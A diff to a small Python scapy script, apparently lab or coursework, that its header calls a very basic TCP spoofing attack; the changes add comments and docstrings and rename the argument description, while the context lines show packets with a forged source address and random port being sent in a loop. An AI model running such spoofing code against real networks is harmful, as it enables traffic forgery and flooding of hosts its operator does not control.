@@ -2,6 +2,8 @@
 Authors : Fridez Lucas, Maxime Welcklen
 Attack :  Very basic TCP spoofing over N packets
 """
+
+# Imports
 from scapy.all import *
 from scapy.layers.inet import *
 import argparse
@@ -20,7 +22,7 @@ def __configure_argparse__():
        parser: Arguments parser
     """
     parser = argparse.ArgumentParser(
-        description='SYN attack arguments')
+        description='Spoofing attack arguments')
 
     # Required params
     requiredNamed = parser.add_argument_group('Optionnal named arguments')
@@ -39,6 +41,8 @@ def main(destination_ip, dport, iface):
 
     Args:
        destination_ip (str): Destination IP
+       dport (int) : Destination port
+       iface (str) : Network interface
     """
     SOURCE_IP = "1.2.3."
     SOURCE_PORT = RandShort()
@@ -49,6 +53,9 @@ def main(destination_ip, dport, iface):
             TCP(sport=SOURCE_PORT, dport=dport) / payload
         send(spoofed_packet, iface=iface)
 
+
+# Entry point
+# Run this script in sudo mode !
 if __name__ == "__main__":
     parser = __configure_argparse__()
     args = parser.parse_args()
